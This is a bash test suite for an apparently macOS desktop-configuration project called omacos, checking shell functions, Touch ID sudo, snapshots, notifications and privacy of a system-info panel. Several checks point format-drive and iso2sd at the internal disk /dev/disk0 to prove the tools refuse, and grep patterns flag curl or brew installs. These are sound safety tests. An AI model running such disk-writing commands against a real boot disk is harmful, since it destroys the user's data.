# The module path is a variable in the source, so the reattach rule is found by
# its ignore_ssh flag. Order matters: pam_tid after reattach, or there is no GUI
# session for the prompt to appear in.
reattach_precedes_pam_tid() {
  local first second
  first=$(grep -n 'optional.*ignore_ssh' "$TID" | head -1 | cut -d: -f1)
  second=$(grep -n 'sufficient     pam_tid.so' "$TID" | head -1 | cut -d: -f1)
  [[ -n $first && -n $second ]] && (( first < second ))
}
check "reattach runs before pam_tid" reattach_precedes_pam_tid
check "ssh sessions skip reattach"   "grep -q 'ignore_ssh' $TID"
check "off spares a file it did not write" "grep -q 'was not written by omacos' $TID"
check "sudo is proven after writing" "grep -q 'password is required' $TID"
check "a bad write is rolled back"   "grep -q 'Removing .* again' $TID"
check "doctor reports it"            "grep -q 'sudo takes Touch ID' $OMACOS_PATH/bin/omacos-doctor"
# The SIGPIPE trap this project already documents for csrutil: grep -q exits on
# the first hit, ioreg takes SIGPIPE, and pipefail reports the check as false.
check "no ioreg is piped into grep -q" \
  "! grep -qE 'ioreg[^|]*\| *grep -q' $TID $OMACOS_PATH/bin/omacos-doctor"

printf '\n\033[1mShell functions\033[0m\n'
FNS="$OMACOS_PATH/default/zsh/functions.zsh"
# Every check runs in `zsh -f` with the file sourced, so nothing here depends on
# the developer's own shell.
zfn() { zsh -f -c "setopt GLOB_DOTS EXTENDED_GLOB; source '$FNS'; $1" 2>&1; }

check "the layer parses as zsh"  "zsh -n $FNS"
check "omacos.zsh sources it"    "grep -q 'default/zsh/functions.zsh' $OMACOS_PATH/default/zsh/omacos.zsh"
check "it is behind a knob"      "grep -q 'OMACOS_FUNCTIONS' $OMACOS_PATH/default/zsh/omacos.zsh"
check "fswatch is in the Brewfile" "grep -q '^brew \"fswatch\"' $OMACOS_PATH/Brewfile"

# `local path=...` empties PATH in zsh, because $path IS $PATH. That cost a
# debugging session; these names must never be declared local again.
no_zsh_special_locals() {
  ! grep -nE '^[[:space:]]*local .*\b(path|argv|cdpath|fpath|manpath|status|options|signals|dirstack|module_path|psvar)=' "$FNS"
}
check "no local shadows a zsh special" no_zsh_special_locals

# Aliases are expanded when a function body is parsed, and this file is sourced
# after omacos.zsh's alias block — so a bare `grep` in here became `rg` and lsw
# started matching its own search. The file turns expansion off while it is
# parsed; this proves it, by aliasing the two that actually bite.
aliases_do_not_leak_in() {
  local body
  body=$(zsh -f -c "alias grep=rg; alias cat=bat; source '$FNS'; which -a _omacos_refuse_internal _omacos_rsw_processes lsw dsw" 2>&1)
  [[ $body != *" rg "* && $body != *" bat "* ]]
}
check "aliases do not leak into bodies" aliases_do_not_leak_in
check "aliases survive the file"        "zfn 'alias grep=rg' >/dev/null; zsh -f -c \"alias grep=rg; source '$FNS'; alias grep\" | grep -q 'grep=rg'"

check "compress round-trips"     "zfn 'cd \$(mktemp -d); mkdir p; echo hi > p/f; compress p >/dev/null; rm -rf p; decompress p.tar.gz; cat p/f' | grep -q hi"
# macOS tar buries a ._ AppleDouble beside every entry unless told not to.
check "no AppleDouble in the tarball" \
  "zfn 'cd \$(mktemp -d); mkdir p; echo hi > p/f; compress p >/dev/null; tar -tzf p.tar.gz' | grep -qv '\\._'"
check "compress states its usage" "zfn 'compress' | grep -q Usage"

check "ga refuses outside a repo" "zfn 'cd \$(mktemp -d); ga branch' | grep -q 'Not a git repository'"
check "gd refuses a plain checkout" "zfn 'cd \$(mktemp -d); gd' | grep -q 'Not a worktree'"

check "tmux layouts need tmux"   "zfn 'unset TMUX; tdl agent' | grep -q 'Start tmux first'"
check "tsl needs a pane count"   "zfn 'unset TMUX; tsl' | grep -q Usage"

check "rsw states its usage"     "zfn 'rsw' | grep -q 'Usage: rsw'"
check "rsw rejects a missing dir" "zfn 'rsw /nope/nothing /tmp' | grep -q 'No such directory'"
check "lsw is quiet when idle"   "zfn 'lsw' | grep -q 'No active watches'"
check "dsw is quiet when idle"   "zfn 'dsw' | grep -q 'No active watches'"
check "lip is quiet when idle"   "zfn 'lip' | grep -q 'No active forwards'"
check "fip states its usage"     "zfn 'fip' | grep -q 'Usage: fip'"

# The reconnect wrapper must only re-run sessions that are safe to re-run: a
# remote command would have its side effects replayed.
check "a bare destination is interactive" \
  "zfn '_omacos_ssh_interactive host && echo yes' | grep -q yes"
check "a glued option value is handled" \
  "zfn '_omacos_ssh_interactive -p2222 host && echo yes' | grep -q yes"
check "a separated option value is handled" \
  "zfn '_omacos_ssh_interactive -p 2222 host && echo yes' | grep -q yes"
check "a remote command is not replayed" \
  "zfn '_omacos_ssh_interactive host uptime || echo no' | grep -q no"
check "no destination is not interactive" \
  "zfn '_omacos_ssh_interactive || echo no' | grep -q no"

# Nothing here may ever point dd or diskutil at the disk you booted from.
check "format-drive refuses an internal disk" \
  "zfn 'format-drive /dev/disk0 X' | grep -q 'not an external disk'"
check "format-drive refuses a partition" \
  "zfn 'format-drive /dev/disk0s2 X' | grep -q 'not a partition\\|whole disk'"
check "iso2sd refuses an internal disk" \
  "zfn 'iso2sd $FNS /dev/disk0' | grep -q 'not an external disk'"
check "iso2sd needs a real image" \
  "zfn 'iso2sd /nope/none.iso /dev/disk4' | grep -q 'No such file'"

printf '\n\033[1mWeather location\033[0m\n'
# Omarchy pins the weather to a place when IP geolocation guesses wrong. The
# answer belongs in local.env with every other "which one do you want".
check "location defaults to your IP" \
  "omacos-notice location | grep -q 'IP address'"
check "a place can be pinned" \
  "omacos-notice location Malibu >/dev/null && grep -q '^OMACOS_WEATHER_LOCATION=Malibu' $OMACOS_CONFIG/local.env"
check "it reads back" \
  "omacos-notice location | grep -q 'Weather location: Malibu'"
check "coordinates win over the name" \
  "omacos-notice location Malibu 34.0259,-118.7798 >/dev/null && grep -q '34.0259' $OMACOS_CONFIG/local.env"
# --clear has to remove the line, not blank it: `KEY=''` reads as a setting
# somebody made, and it is the one thing an empty value is supposed to undo.
check "clearing removes the line" \
  "omacos-notice location --clear >/dev/null && ! grep -q OMACOS_WEATHER_LOCATION $OMACOS_CONFIG/local.env"
check "clearing twice is harmless" \
  "omacos-notice location --clear >/dev/null && omacos-notice location --clear >/dev/null"
check "clearing leaves the rest alone" \
  "grep -q '^WORK_DIR=' $OMACOS_CONFIG/local.env"
check "a reminder listing is bound" \
  "grep -q '^alt-ctrl-cmd-r |.*omacos-reminder list' $OMACOS_PATH/config/omacos/keymap.conf"

printf '\n\033[1mSystem info\033[0m\n'
SYSINFO=$(omacos-system-info --plain 2>/dev/null)
check "the panel renders"        "test -n \"\$SYSINFO\""
check "it has all three sections" "grep -q Hardware <<<\"\$SYSINFO\" && grep -q Software <<<\"\$SYSINFO\" && grep -q Uptime <<<\"\$SYSINFO\""
check "it names the machine"     "grep -qE '^ *Mac +\\S' <<<\"\$SYSINFO\""
check "it says how old it is"    "grep -qE 'Uptime.*(day|hour|min)' <<<\"\$SYSINFO\""
# "1 days" is the tell that nobody read the output twice.
check "it does not say '1 days'" "! grep -qE '\\b1 (days|hours|mins)\\b' <<<\"\$SYSINFO\""
# A row with a label and no value is noise; row() is supposed to drop those.
check "no row is left empty"     "! grep -qE '^ +[A-Za-z][A-Za-z ]+ +$' <<<\"\$SYSINFO\""
check "--plain drops the mark"   "! grep -q '▄' <<<\"\$SYSINFO\""
check "--plain drops the colour" "! printf '%s' \"\$SYSINFO\" | grep -q \$'\\033'"
# It has to work on a machine with no desktop layer, like CI and like anyone
# who stopped at the terminal half.
check "it runs without AeroSpace" "PATH=$NO_WM omacos-system-info --plain | grep -q Hardware"

# The panel is the thing people paste into a bug report, so the identifiers
# macOS keeps next to the model name must never reach it. Two checks: the
# source may not reach for them, and the output may not contain the real one.
check "the source avoids the JSON form" \
  "! grep -q 'system_profiler -json' $OMACOS_PATH/bin/omacos-system-info"
# Comments are stripped first: the header says out loud which identifiers it
# refuses to touch, and that sentence is the opposite of a leak.
source_names_no_identifier() {
  ! grep -vE '^[[:space:]]*#' "$OMACOS_PATH/bin/omacos-system-info" \
    | grep -qiE 'serial|platform_uuid|provisioning|udid'
}
check "the source names no identifier" source_names_no_identifier
panel_leaks_no_serial() {
  local serial
  serial=$(system_profiler SPHardwareDataType 2>/dev/null | sed -n 's/^ *Serial Number (system): *//p' | head -1)
  # Nothing to leak on a runner that reports no serial; the two source checks
  # above still hold there.
  [[ -n $serial ]] || return 0
  ! grep -qF "$serial" <<<"$SYSINFO"
}
check "the panel leaks no serial" panel_leaks_no_serial

printf '\n\033[1mPinned windows\033[0m\n'
# The scripts have to behave on a machine with no desktop layer at all: one is
# on the path of every workspace switch, and must never be the reason one fails.
check "nothing pinned lists nothing" "PATH=$NO_WM omacos-window-pin list | grep -q 'Nothing is pinned'"
check "pinning needs AeroSpace"      "! PATH=$NO_WM omacos-window-pin 2>/dev/null"
check "pinning says why"             "PATH=$NO_WM omacos-window-pin 2>&1 | grep -q AeroSpace"
check "follow is free when idle"     "PATH=$NO_WM omacos-window-follow-pinned"
follow_survives_no_aerospace() {
  local rc
  mkdir -p "$OMACOS_STATE/pinned" && : > "$OMACOS_STATE/pinned/4242"
  PATH="$NO_WM" omacos-window-follow-pinned
  rc=$?
  rm -rf "$OMACOS_STATE/pinned"
  return $rc
}
check "follow survives no AeroSpace" follow_survives_no_aerospace
check "pin rejects an unknown verb"  "! omacos-window-pin bogus 2>/dev/null"

printf '\n\033[1mCLI surface\033[0m\n'
# Omarchy's CLI is discoverable by design; --check is what keeps ours that way
# as commands are added.
check "commands --check passes"    "omacos commands --check"
check "--all includes hidden"      "test \$(omacos commands --all | wc -l) -gt \$(omacos commands | wc -l)"
check "per-command help"           "omacos theme set --help | grep -q 'Apply a theme everywhere'"
check "per-command help has examples" "omacos reminder --help | grep -q 'Tea ready'"
check "group help still lists"     "omacos capture --help | grep -q 'Take a screenshot'"

printf '\n\033[1mNotices and reminders\033[0m\n'
export OMACOS_DRY_RUN=1
check "notify does not draw in tests" "omacos-cmd-notify T M | grep -q 'would notify'"
check "time notice"                "omacos-notice time | grep -qE '[0-9]{2}:[0-9]{2}'"
check "battery notice"             "omacos-notice battery | grep -q Battery"
check "notice rejects unknown"     "! omacos-notice nonsense 2>/dev/null"
check "reminder schedules"         "omacos-reminder 5 'Tea ready' | grep -q 'Reminder set'"
check "reminder lists what is due" "omacos-reminder list | grep -q 'Tea ready'"
check "reminder rejects bad input" "! omacos-reminder abc x 2>/dev/null"
check "reminder clears"            "omacos-reminder clear | grep -q 'Cleared 1'"
check "cleared means empty"        "omacos-reminder list | grep -q 'No reminders'"
# Piping it must print, not open a window: stdin is still a terminal when
# stdout is a pipe, and only stdin says whether a human is there.
check "listing survives a pipe"   "omacos-reminder list | cat | grep -q 'No reminders'"

printf '\n\033[1mNotifications\033[0m\n'
# terminal-notifier exits 0 even when macOS has refused it permission, so the
# exit code cannot be trusted and the fallback has to key on what it printed.
shim="$sandbox/shim"; mkdir -p "$shim"
printf '#!/usr/bin/env bash\necho "Could not request notification permission" >&2\nexit 0\n' \
  > "$shim/terminal-notifier"
# The fallback is the point of the test, and the real fallback posts a real
# banner. Shim osascript too, or running the suite spams the machine it runs on.
printf '#!/usr/bin/env bash\nexit 0\n' > "$shim/osascript"
chmod +x "$shim/terminal-notifier" "$shim/osascript"
check "a refused banner is reported" \
  "env PATH=$shim:\$PATH OMACOS_DRY_RUN=0 omacos-cmd-notify T M 2>&1 | grep -q 'could not post'"
printf '#!/usr/bin/env bash\nexit 0\n' > "$shim/terminal-notifier"
check "a posted banner stays quiet" \
  "test -z \"\$(env PATH=$shim:\$PATH OMACOS_DRY_RUN=0 omacos-cmd-notify T M 2>&1)\""

# Focus has no public API outside Shortcuts, so the whole command is "is the
# shortcut there, and does it run" — both halves shimmed, so a test run never
# touches the real Shortcuts library or the machine's Focus state.
printf '#!/usr/bin/env bash\ncase $1 in list) echo other-shortcut; echo omacos-dnd ;; run) exit 0 ;; esac\n' \
  > "$shim/shortcuts"
chmod +x "$shim/shortcuts"
check "dnd status sees the shortcut" \
  "env PATH=$shim:\$PATH omacos-toggle-dnd status | grep -q 'wired up'"
check "dnd runs the shortcut" \
  "env PATH=$shim:\$PATH OMACOS_DRY_RUN=1 omacos-toggle-dnd | grep -q 'would run shortcut: omacos-dnd'"
printf '#!/usr/bin/env bash\ncase $1 in list) echo other-shortcut ;; esac\n' > "$shim/shortcuts"
check "dnd says when it is not set up" \
  "! env PATH=$shim:\$PATH omacos-toggle-dnd status >/dev/null 2>&1"
check "dnd points at the setup command" \
  "env PATH=$shim:\$PATH omacos-toggle-dnd 2>&1 | grep -q 'omacos setup dnd'"
# A name that merely contains the shortcut's must not count as having it.
printf '#!/usr/bin/env bash\ncase $1 in list) echo omacos-dnd-old ;; esac\n' > "$shim/shortcuts"
check "dnd matches the whole name"  \
  "! env PATH=$shim:\$PATH omacos-toggle-dnd status >/dev/null 2>&1"
check "dnd setup installs nothing"  \
  "! grep -qE 'brew install|curl ' $OMACOS_PATH/bin/omacos-setup-dnd"

printf '\n\033[1mClipboard history\033[0m\n'
mkdir -p "$OMACOS_STATE/clipboard"
printf 'first thing'  > "$OMACOS_STATE/clipboard/entry-1000-a"
printf 'second thing' > "$OMACOS_STATE/clipboard/entry-2000-b"
check "newest entry comes first"   "omacos-clipboard-history --plain | head -1 | grep -q 'second thing'"
check "clear empties the store"    "omacos-clipboard-clear >/dev/null && test -z \"\$(ls -A $OMACOS_STATE/clipboard)\""
# The one property that separates a clipboard history from a password log.
check "concealed types are skipped" \
  "grep -q 'org.nspasteboard.ConcealedType' $OMACOS_PATH/default/swift/omacos-helper.swift"
check "watcher runs under a login agent" "grep -q 'com.omacos.clipboard' $OMACOS_PATH/bin/omacos-setup-clipboard"

printf '\n\033[1mCapture\033[0m\n'
check "screenshot rejects a bad mode"  "! omacos-capture-screenshot bogus 2>/dev/null"
check "stopping nothing is not an error" \
  "omacos-capture-screenrecording --stop | grep -q 'Nothing is recording'"
# Compiles on the machine it runs on, so a broken helper fails here rather than
# under a hotkey a week later.
check "native helper builds"       "omacos-cmd-build-helper >/dev/null && test -x $OMACOS_STATE/bin/omacos-helper"
check "helper reports its usage"   "! $OMACOS_STATE/bin/omacos-helper 2>/dev/null"
check "helper rejects a missing image" "! $OMACOS_STATE/bin/omacos-helper ocr /nope.png 2>/dev/null"

printf '\n\033[1mToggles\033[0m\n'
check "idle status is a predicate" "! omacos-toggle-idle status >/dev/null"
check "idle on then off"           "omacos-toggle-idle on >/dev/null && omacos-toggle-idle status >/dev/null && omacos-toggle-idle off >/dev/null && ! omacos-toggle-idle status >/dev/null"
check "nightlight explains itself" "grep -q 'private' $OMACOS_PATH/bin/omacos-toggle-nightlight"
# Reads the real user's preferences — `defaults` is per-user, not per-HOME —
# so only the read-only branch is exercised here.
check "dictation status reads"     "omacos-setup-dictation status | grep -q Dictation"
# The point of using the built-in one is that nothing gets downloaded.
check "dictation installs nothing"  "! grep -qE 'brew install|curl ' $OMACOS_PATH/bin/omacos-setup-dictation"

printf '\n\033[1mSystem toggles\033[0m\n'
gaps_round_trip() {
  local toml="$XDG_CONFIG_HOME/aerospace/aerospace.toml"
  omacos-toggle-gaps >/dev/null 2>&1 || return 1
  omacos-state check gaps-off || return 1
  # Zeroed in place. A second [gaps] table would be invalid TOML, so the test
  # also asserts there is still exactly one.
  [[ $(grep -c '^\[gaps\]' "$toml") -eq 1 ]] || return 1
  grep -qE '^inner\.horizontal = 0' "$toml" || return 1
  omacos-toggle-gaps >/dev/null 2>&1 || return 1
  ! omacos-state check gaps-off || return 1
  grep -qE '^inner\.horizontal = [1-9]' "$toml"
}
check "gaps toggle round trips"    gaps_round_trip
check "font list returns families" "omacos-font-list | grep -q ."
check "audio output names its dependency" \
  "env PATH=/usr/bin:/bin $OMACOS_PATH/bin/omacos-toggle-audio-output 2>&1 | grep -q switchaudio-osx"

# osascript and pbcopy both shimmed: the real ones would ask the frontmost app
# for a URL and then overwrite the clipboard of whoever ran the tests.
printf '#!/usr/bin/env bash\nexit 0\n' > "$shim/pbcopy"
printf '#!/usr/bin/env bash\ncase "$*" in *frontmost*) echo Finder ;; esac\n' > "$shim/osascript"
chmod +x "$shim/pbcopy" "$shim/osascript"
check "url copy refuses a non-browser" \
  "! env PATH=$shim:\$PATH omacos-capture-url 2>&1 | grep -q 'http'"
check "url copy names the app it saw" \
  "env PATH=$shim:\$PATH omacos-capture-url 2>&1 | grep -q Finder"
printf '#!/usr/bin/env bash\ncase "$*" in *frontmost*) echo Safari ;; *) echo https://example.com ;; esac\n' \
  > "$shim/osascript"
check "url copy reads a browser"   \
  "env PATH=$shim:\$PATH OMACOS_DRY_RUN=1 omacos-capture-url | grep -q 'https://example.com'"
# Shortcuts is public API and must outrank the private-framework CLI.
printf '#!/usr/bin/env bash\ncase $1 in list) echo omacos-nightlight ;; run) exit 0 ;; esac\n' \
  > "$shim/shortcuts"
check "nightlight prefers the shortcut" \
  "env PATH=$shim:\$PATH OMACOS_DRY_RUN=1 omacos-toggle-nightlight | grep -q 'would run shortcut'"
check "nightlight still explains the tap" \
  "grep -q 'trust-tap smudge/smudge' $OMACOS_PATH/bin/omacos-toggle-nightlight"

printf '\n\033[1mBackgrounds\033[0m\n'
omacos-theme-set tokyo-night >/dev/null 2>&1
mkdir -p "$OMACOS_CONFIG/backgrounds/tokyo-night"
printf 'a second, distinct image\n' > "$OMACOS_CONFIG/backgrounds/tokyo-night/extra.png"
background_changes() {
  local before after
  before=$(readlink "$OMACOS_STATE/current/background")
  omacos-theme-background next >/dev/null || return 1
  after=$(readlink "$OMACOS_STATE/current/background")
  [[ $before != "$after" ]]
}
check "list marks the active one"  "omacos-theme-background list | grep -q '[*]'"
check "next moves to another image" background_changes
# env-bootstrap derives OMACOS_STATE from XDG_STATE_HOME, so that is the knob
# a caller actually has.
check "a theme with no images says so" \
  "! env XDG_STATE_HOME=$sandbox/empty-state omacos-theme-background list 2>/dev/null"
unset OMACOS_DRY_RUN

printf '\n\033[1mApp roles\033[0m\n'
# osascript decides whether an app exists and open launches it; shim both, or
# the suite starts opening applications on the machine running it.
printf '#!/usr/bin/env bash\ncase "$*" in *TestApp*) echo com.test.app ;; *) exit 1 ;; esac\n' \
  > "$shim/osascript"
printf '#!/usr/bin/env bash\necho "open $*"\n' > "$shim/open"
chmod +x "$shim/osascript" "$shim/open"
printf 'MUSIC_APP="TestApp"\n' >> "$OMACOS_CONFIG/local.env"
check "local.env names the app"    \
  "env PATH=$shim:\$PATH omacos-launch-app music | grep -q 'open -a TestApp'"
check "--has is a predicate"       "env PATH=$shim:\$PATH omacos-launch-app music --has"
# Nothing installed for the role, but it has a website: open that instead.
check "a web role falls back"      \
  "env PATH=$shim:\$PATH omacos-launch-app youtube | grep -q youtube.com"
# Nothing installed and no website: say which variable would fix it.
check "a dead role names its variable" \
  "! env PATH=$shim:\$PATH omacos-launch-app calendar 2>&1 | grep -q 'open -a'"
check "a dead role is an error"    "! env PATH=$shim:\$PATH omacos-launch-app calendar >/dev/null 2>&1"
check "--has fails for a dead role" "! env PATH=$shim:\$PATH omacos-launch-app calendar --has"
check "an unknown role lists the roles" \
  "! env PATH=$shim:\$PATH omacos-launch-app nonsense 2>&1 | grep -q 'open'"
check "private browsing is offered" "grep -q 'incognito' $OMACOS_PATH/bin/omacos-launch-browser"

printf '\n\033[1mSnapshots\033[0m\n'
# tmutil talks to the real disk, so every check here goes through a shim. The
# logic worth testing is the parsing and the bookkeeping, not whether Apple's
# tool works.
snapshot_shim="$sandbox/snapshot-shim"; mkdir -p "$snapshot_shim"
cat > "$snapshot_shim/tmutil" <<'SHIM'
#!/usr/bin/env bash
case "$1" in
  localsnapshot)
    echo "NOTE: local snapshots are considered purgeable."
    echo "Created local snapshot with date: 2026-09-22-185121" ;;
  listlocalsnapshots)
    for d in ${FAKE_SNAPSHOTS:-}; do echo "com.apple.TimeMachine.$d.local"; done ;;
  deletelocalsnapshots)
    echo "Deleted local snapshot '$2'" ;;
esac
SHIM
chmod +x "$snapshot_shim/tmutil"
# The fake snapshot list is the first argument, not an `env` prefix: `env`
# runs a binary, and snap is a function, so a prefix would never reach it.
snap() { local fake=$1; shift; env PATH="$snapshot_shim:$PATH" FAKE_SNAPSHOTS="$fake" "$@"; }

# Pure string work, and the one thing every other command formats through.
check "a date renders as a date" \
  "omacos-snapshot-list --format 2026-09-22-185121 | grep -q '2026-09-22 18:51'"

# The predicate half: no snapshots must be a non-zero exit, because the menu
# hides its restore rows on exactly this.
check "no snapshots exits non-zero" \
  "! snap '' omacos-snapshot-list --plain"
check "snapshots exit zero" \
  "snap 2026-09-22-185121 omacos-snapshot-list --plain | grep -q 2026-09-22-185121"
# Newest first, or `restore` with no argument picks the wrong one.
check "newest snapshot is listed first" \
  "snap '2026-09-20-100000 2026-09-22-185121' omacos-snapshot-list --plain | head -1 | grep -q 2026-09-22-185121"

# macOS names every snapshot com.apple.TimeMachine.*, so the marker file is
# the only way to tell one omacos took before an update from Time Machine's
# own hourly ones.
check "create records the snapshot as ours" \
  "snap '' omacos-snapshot-create --quiet | grep -q 2026-09-22-185121 && test -e $OMACOS_STATE/snapshots/2026-09-22-185121"
check "ours are marked in the listing" \
  "snap 2026-09-22-185121 omacos-snapshot-list | grep -q 'taken by omacos'"
check "delete forgets the marker" \
  "snap '' omacos-snapshot-delete 2026-09-22-185121 >/dev/null && ! test -e $OMACOS_STATE/snapshots/2026-09-22-185121"

# A snapshot taken after the machine changed is worth nothing, so the step has
# to come before the pull and the upgrade.
snapshot_runs_first() {
  local order
  order=$(grep -nE 'omacos-snapshot-create|^step "Fetching|brew upgrade' "$OMACOS_PATH/bin/omacos-update" | head -3)
  [[ $(head -1 <<<"$order") == *omacos-snapshot-create* ]]
}
check "update snapshots before it changes anything" snapshot_runs_first
# No opt-out, on purpose: the hurried update is the one worth snapshotting.
check "the snapshot cannot be skipped" "! grep -q '\-\-no-snapshot' $OMACOS_PATH/bin/omacos-update"
check "update rejects unknown flags"   "! omacos-update --no-snapshot 2>/dev/null"
# One package failing to build must not cost the migrations that follow it.
check "a failed upgrade does not end the update" \
  "grep -q 'did not upgrade' $OMACOS_PATH/bin/omacos-update"

printf '\n\033[1mThe Mac differences\033[0m\n'
# alt-w closes a window and alt-q ends the app: the one place macOS genuinely
# differs from every window manager Omarchy's manual describes.
check "alt-q is bound"       "grep -q '^alt-q |' $OMACOS_PATH/config/omacos/keymap.conf"
check "alt-w is still close" "grep -q '^alt-w | Close window' $OMACOS_PATH/config/omacos/keymap.conf"
# Quitting the window manager or the bar with a window-management key is never
# what was meant.
check "quit refuses the WM"  "grep -q 'bobko.aerospace' $OMACOS_PATH/bin/omacos-cmd-quit-app"
check "quit spares Finder"   "grep -q 'com.apple.finder' $OMACOS_PATH/bin/omacos-cmd-quit-app"

# "No dock and no desktop icons" — both only apply with the tiling layer on.
check "desktop icons are turned off" \
  "grep -q 'com.apple.finder CreateDesktop bool 0' $OMACOS_PATH/install/4-macos-defaults.sh"
check "the wallpaper is not a button" \
  "grep -q 'EnableStandardClickToShowDesktop bool 0' $OMACOS_PATH/install/4-macos-defaults.sh"
# Hiding them is an opinion, and an install that keeps re-hiding icons you put
# back is a fork waiting to happen.
check "desktop icons can be declined" \
  "grep -q 'DESKTOP_ICONS' $OMACOS_PATH/install/4-macos-defaults.sh"
# The knob is read at the top of the file; if local.env moved back below the
# desktop block it would be unset by the time that block runs.
desktop_icons_knob_is_readable() {
  local file="$OMACOS_PATH/install/4-macos-defaults.sh" env_line use_line
  # Match the code, not the comments that mention either name.
  env_line=$(grep -n '^\[\[ -f \$OMACOS_CONFIG/local.env' "$file" | head -1 | cut -d: -f1)
  use_line=$(grep -n '\${DESKTOP_ICONS' "$file" | head -1 | cut -d: -f1)
  [[ -n $env_line && -n $use_line ]] && (( env_line < use_line ))
}
check "local.env is read before it is used" desktop_icons_knob_is_readable
# Hiding the macOS menu bar is a choice, not a default: plenty of Mac apps
# keep the only copy of a command up there.
check "the menu bar stays unless asked" \
  "! grep -q '_HIHideMenuBar' $OMACOS_PATH/install/4-macos-defaults.sh"
check "the menu bar is one command away" \
  "omacos toggle menubar --help | grep -q 'menu bar'"

printf '\n\033[1mReachability\033[0m\n'
# A binding or a menu row that names a command which does not exist is a dead
# key: nothing fails, nothing happens.
keymap_commands_exist() {
  local cmd
  while IFS= read -r cmd; do
    [[ -x "$OMACOS_PATH/bin/$cmd" ]] || { echo "missing: $cmd"; return 1; }
  done < <(grep -oE 'exec-and-forget omacos-[a-z-]+' "$OMACOS_PATH/config/omacos/keymap.conf" \
           | awk '{print $2}' | sort -u)
  return 0
}
menu_commands_exist() {
  local cmd
  while IFS= read -r cmd; do
    [[ $cmd == omacos-* ]] || continue
    [[ -x "$OMACOS_PATH/bin/$cmd" ]] || { echo "missing: $cmd"; return 1; }
  done < <(jq -r '.[].action // empty' "$OMACOS_PATH/default/menu.json" \
           | awk '{print $1}' | tr -d ';' | sort -u)
  return 0
}
# The bar's click table is a third place that names commands, and a click
# that runs nothing looks exactly like a bar that ignores the mouse.
click_commands_exist() {
  local cmd
  while IFS= read -r cmd; do
    [[ -x "$OMACOS_PATH/bin/$cmd" ]] || { echo "missing: $cmd"; return 1; }
  done < <(grep -oE '\bomacos-[a-z-]+' "$OMACOS_PATH/config/sketchybar/plugins/click.sh" | sort -u)
  return 0
}
# Every item the bar draws should answer the mouse; one that does not is a
# dead patch of a bar where everything else is clickable.
bar_items_are_clickable() {
  local item
  for item in front_app recording idle clock battery theme; do
    grep -q "click.sh $item" "$OMACOS_PATH/config/sketchybar/sketchybarrc" \
      || { echo "not clickable: $item"; return 1; }
  done
  return 0
}
check "every keybinding names a real command" keymap_commands_exist
check "every menu row names a real command"   menu_commands_exist
check "every bar click names a real command"  click_commands_exist
check "every bar item takes clicks"           bar_items_are_clickable
check "clicks distinguish the buttons"        "grep -q 'BUTTON' $OMACOS_PATH/config/sketchybar/plugins/click.sh"
check "the capture menu has rows"             "omacos-menu --list capture | grep -q capture.text"
check "the toggles menu has rows"             "omacos-menu --list toggles | grep -q toggles.idle"

printf '\n\033[1mDev link\033[0m\n'
# The two-tree workflow rests on this pair of commands, so exercise the round
# trip rather than trusting that writing one file is self-evidently correct.
export HOME="$sandbox"
fake_installed="$HOME/.local/share/omacos"
mkdir -p "$(dirname "$fake_installed")"
ln -sfn "$OMACOS_PATH" "$fake_installed"

link_resolves_to() {
  env HOME="$HOME" XDG_CONFIG_HOME="$XDG_CONFIG_HOME" XDG_STATE_HOME="$XDG_STATE_HOME" \
    bash -c '. "$0"/default/env-bootstrap; printf %s "$OMACOS_PATH"' "$OMACOS_PATH"
}

checkout="$sandbox/checkout"
mkdir -p "$checkout/bin" "$checkout/default"
cp "$OMACOS_PATH/bin/omacos" "$checkout/bin/omacos"
cp "$OMACOS_PATH/default/env-bootstrap" "$checkout/default/env-bootstrap"
cp -R "$OMACOS_PATH/bin/omacos-finalize-user" "$OMACOS_PATH/bin/omacos-migrate" "$checkout/bin/"

check "rejects a non-checkout"     "! omacos-dev-link $sandbox 2>/dev/null"
check "rejects a missing path"     "! omacos-dev-link $sandbox/nope 2>/dev/null"
# bin/omacos alone is not enough: every script sources default/env-bootstrap.
partial="$sandbox/partial"; mkdir -p "$partial/bin"; cp "$OMACOS_PATH/bin/omacos" "$partial/bin/omacos"
check "rejects an incomplete tree" "! omacos-dev-link $partial 2>/dev/null"

check "link writes path.conf"      "omacos-dev-link $checkout >/dev/null 2>&1 && grep -q $checkout $OMACOS_CONFIG/path.conf"
check "bootstrap follows the link" "test \"\$(link_resolves_to)\" = $checkout"
check "status reports linked"      "omacos-dev-status 2>/dev/null | grep -q linked"
# The grep for trailing conditionals only sees a script's last line, so it
# misses a `cond && action` that ends the last *statement*. Exercise the exit
# code directly, in the branch that has the least to report.
bare="$sandbox/no-installed"; mkdir -p "$bare/.config/omacos" "$bare/.local/state/omacos"
printf 'OMACOS_PATH=%q\n' "$checkout" > "$bare/.config/omacos/path.conf"
check "status exits 0 with no installed tree" \
  "env HOME=$bare XDG_CONFIG_HOME=$bare/.config XDG_STATE_HOME=$bare/.local/state omacos-dev-status"

# The failure this pair is most likely to hit in real use: the checkout gets
# renamed or deleted while still linked. Without a fallback, OMACOS_PATH points
# at nothing, bin/ never lands on PATH, and `omacos dev unlink` is unreachable.
mv "$checkout" "$sandbox/checkout-moved"
check "stale link falls back"      "test \"\$(link_resolves_to)\" = $fake_installed"
check "stale link says so"         "link_resolves_to 2>&1 >/dev/null | grep -q 'checkout is gone'"
# Every command sources env-bootstrap, so an unguarded warning would print on
# each one and train people to ignore it.
check "stale link warns once"      "test \$(link_resolves_to 2>&1 >/dev/null | grep -c 'checkout is gone') -eq 1"
check "child processes stay quiet" "test -z \"\$(env HOME=$HOME XDG_CONFIG_HOME=$XDG_CONFIG_HOME OMACOS_STALE_LINK=x bash -c '. $OMACOS_PATH/default/env-bootstrap' 2>&1)\""
check "omacos still resolves"      "omacos --help >/dev/null 2>&1"
mv "$sandbox/checkout-moved" "$checkout"

check "unlink removes path.conf"   "omacos-dev-unlink >/dev/null 2>&1; ! test -e $OMACOS_CONFIG/path.conf"
check "unlink twice is harmless"   "omacos-dev-unlink >/dev/null 2>&1"
check "status reports installed"   "omacos-dev-status 2>/dev/null | grep -q installed"
# A stale link leaves the machine working and the mode misreported, which is
# exactly the state `dev status` exists to rule out.
printf 'OMACOS_PATH=%q\n' "$sandbox/vanished" > "$OMACOS_CONFIG/path.conf"
check "status flags a stale link"  "omacos-dev-status 2>/dev/null | grep -q 'stale link'"
rm -f "$OMACOS_CONFIG/path.conf"
# Unlinked is the normal state; forgetting where the checkout is would send the
# next person — or agent — straight back to editing the installed tree.
check "status names the checkout when unlinked" \
  "omacos-dev-status 2>/dev/null | grep -A1 checkout | grep -q $(basename "$checkout")"
